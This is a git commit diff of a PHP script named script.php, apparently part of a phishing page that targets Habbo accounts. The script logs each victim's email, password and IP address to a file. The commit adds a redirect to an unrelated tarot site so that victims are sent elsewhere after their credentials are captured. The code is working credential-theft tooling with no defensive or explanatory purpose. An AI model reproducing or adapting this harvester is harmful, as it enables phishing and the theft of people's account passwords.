ba341a5912d4ecf4bdd6171f3a0bb7d30f0cdeac
amarresdeamor <35212983+amarresdeamor@users.noreply.github.com>
2018-01-10 10:06:03 +0100

    Update script.php

--- script.php
+++ script.php
@@ -10,5 +10,5 @@ header ('Location:index.html');
     fwrite ($f, 'Email: [<b><font color="#0000FF">'.$habbo.'</font></b>] Password: [<b><font color="#FF0040">'.$password.'</font></b>] IP: [<b><font color="#FE2EF7">'.$ip.'</font></b>]<br>');
 fclose($f);
 
-");
+header("Location: https://amarresdeamor.github.io/tarot_marsella/");
 ?>
